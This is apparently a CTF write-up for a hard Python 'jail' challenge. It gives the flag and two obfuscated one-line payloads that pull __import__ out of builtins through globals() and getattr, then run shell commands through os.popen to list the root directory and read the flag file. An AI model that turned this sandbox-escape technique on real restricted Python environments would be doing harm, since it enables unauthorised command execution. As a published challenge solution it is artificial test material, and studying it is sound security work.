# Capital Jail hard

--------------------

### Description

**Difficulty:** hard

This jail seems to be far more advanced! Can you escape now?

```
nc some.server 1339
```

**Flag:** shadowctf{5c446e9e48716d0b2a93e6de38a0de13}

--------------------

### Solution

``` python
(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").popen("ls /").read())
(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").popen("cat /flag????f?c???????ad?b???b?a?ea?f?c??.txt").read())
```

--------------------

### Running

`docker-compose up`
